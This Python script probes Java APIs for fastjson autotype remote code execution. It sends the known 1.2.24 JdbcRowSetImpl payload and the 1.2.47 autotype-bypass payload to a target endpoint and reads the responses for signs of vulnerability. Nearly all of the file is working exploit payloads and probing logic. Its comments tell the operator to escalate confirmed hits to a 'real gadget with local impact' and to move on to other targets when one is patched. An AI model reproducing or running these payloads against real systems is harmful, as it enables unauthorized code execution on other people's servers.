#!/usr/bin/env python3
# [REFERENCE] fastjson autotype RCE probe — 1.2.24 direct, 1.2.47 autotype-bypass
# (works even with autotype off). Chinese-ecosystem Java apps love fastjson for
# JSON API bodies.
# Fingerprint: Java API taking a JSON body; error pages sometimes leak
# "com.alibaba.fastjson" in stack traces. Offline targets: JNDI/JdbcRowSetImpl
# exfil won't call out — use it as a DETECTOR (exception/DNS behavior differs),
# and prefer local-impact gadgets for exploitation.
# Usage: python3 fastjson-autotype-probe.py http://TARGET/api/endpoint
import requests, sys, json, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/api"
# local harmless detector: Inet4Address triggers name resolution attempt through
# fastjson's own object factory; on patched versions the body is rejected
DETECT = {"a": {"@type": "java.net.Inet4Address", "val": "fastjson-probe.invalid"}}
DIRECT = {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName":
          "ldap://127.0.0.1:9/fastjson-direct", "auto_commit": True}
BYPASS47 = {"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"},
            "b": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName":
                  "ldap://127.0.0.1:9/fastjson-147", "auto_commit": True}}
# local-impact classic: file write via java.io.Writer family is config-dependent;
# cheapest local RCE check in labs is BasicDataSource/Tomcat — keep to detection
# here, exploitation needs a per-target gadget decision.

for name, body in (("detect", DETECT), ("direct-1.2.24", DIRECT), ("bypass-1.2.47", BYPASS47)):
    try:
        r = requests.post(BASE, json=body, verify=False, timeout=10)
        t = r.text[:220].replace("\n", " ")
        print("%s %-14s -> %s %s" % ("HIT " if "fastjson" in t.lower() or "jndi" in t.lower() or "connect" in t.lower() else "    ", name, r.status_code, t))
    except Exception as e:
        print("    %-14s ERR %s" % (name, str(e)[:100]))
# Verdicts: stack trace naming fastjson = library present; connection-refused-ish
# errors naming ldap://127.0.0.1:9 = autotype ACTIVE (the gadget resolved and dialed)
# -> escalate to a real gadget with local impact. Clean 200/400 JSON without any of
# the above = patched/newer (>=1.2.68 safeMode kills all) — rotate, don't grind.
